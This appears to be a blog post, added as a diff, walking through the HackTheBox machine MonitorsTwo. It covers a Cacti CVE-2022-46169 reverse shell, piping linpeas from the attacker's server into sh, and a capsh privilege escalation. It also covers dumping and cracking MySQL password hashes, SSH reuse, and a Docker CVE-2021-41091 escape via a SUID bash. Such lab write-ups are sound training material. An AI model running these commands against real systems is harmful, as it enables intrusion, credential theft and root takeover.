@@ -1,0 +1,247 @@
+---
+title: "MonitorsTwo"
+publishedAt: "2024-10-11"
+image: "/images/blog/monitorstwo/htb_monitorstwo.png"
+summary: "A detailed walkthrough of exploiting a HackTheBox machine running Cacti v1.2.22. The process involves exploiting CVE-2022-46169 for initial access, using capsh for container privilege escalation, extracting password hashes from MySQL, and leveraging CVE-2021-41091 for Docker container escape to achieve root access."
+tag: "HackTheBox"
+---
+
+## Initial Reconnaissance
+
+We begin by scanning the machine using nmap.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'nmap -sC -sV [BOX_IP]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+We can see that the port 80 is open. The application running on it is **cacti v1.2.22**. A quick search leads to an exploit for this version at the following GitHub repository: [CVE-2022-46169-CACTI-1.2.22](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22).
+
+## Web Vulnerability Exploitation
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'nc -lvnp [YOUR_PORT]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'python CVE-2022-46169.py -u http://[BOX_IP] --LHOST=[YOUR_IP] --LPORT=[YOUR_PORT]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Boom, we are inside the server.
+
+## Privilege Escalation
+
+On our machine, we set up a Python web server and pull [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest) to help with further enumeration.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'sudo python3 -m http.server 80',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'curl http://[YOUR_IP]/linpeas.sh | sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+LinPEAS indicates a vulnerability with `capsh`. Using the ressources found on [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/), we find a way to exploit this vulnerability:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'capsh --gid=0 --uid=0 --',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Executing `whoami` confirms that we are root.
+
+## Server Discovery
+
+Navigating to the root directory, we locate `entrypoint.sh`. We can look into it with `cat` and then execute it.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'chmod +x entrypoint.sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: './entrypoint.sh',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+We can see that this file requests the database for data with `root` as username and password.
+
+We can take a look inside the different tables : 
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'mysql --host=db --user=root --password=root cacti -e "show tables"',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+From the result of the previous command, we notice the `user_auth` table. We can take a look inside with the following command:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'mysql --host=db --user=root --password=root cacti -e "select * from user_auth"',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+This command reveals password hashes for 3 users (admin, guest, marcus). We store the hashes of admin and marcus in `hashes.txt` and we will use hashcat to attempt a dictionary attack:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'hashcat -m 3200 -a 0 hashes.txt rockyou-75.txt',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+From hashcat, we get the password `funkymonkey` for the user `marcus`. 
+
+## Lateral Movement
+
+Using this information and the fact that nmap also reported us port 22 (SSH) was open, we attempt an SSH login:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'ssh marcus@[BOX_IP]',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Once inside, a quick `ls` shows the `user.txt` file which grants us the user flag.
+
+## New Privilege Escalation
+
+To continue our efforts towards root access, we once again fetch `linpeas.sh` from our Python webserver. We identify Docker's presence on the machine. 
+The Docker version installed, **20.10.5+dfsg1**, is vulnerable to an exploit found on GitHub: [CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091).
+
+Go back to your machine and clone the PoC repository.
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: `git clone https://github.com/UncleJ4ck/CVE-2021-41091
+cd /tmp
+curl http://[YOUR_IP]/exp.sh > exp.sh
+chmod +x exp.sh
+./exp.sh`,
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+The script asks you to execute the following command on the Docker environment (that we previously rooted).
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'chmod u+s /bin/bash',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Navigate to the directory provided in the output of the script and execute:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: './bin/bash -p',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+This grants us a root shell. To find the `root.txt` file, we can use the following command:
+
+<CodeBlock className="my-24"
+    compact
+    codeInstances={[
+        {
+            code: 'find / -type f -name root.txt 2>/dev/null ',
+            language: 'bash'
+        },
+    ]}
+    copyButton
+/>
+
+Reading its content with `cat /root/root.txt` gives us the root flag.
+Happy rooting :)
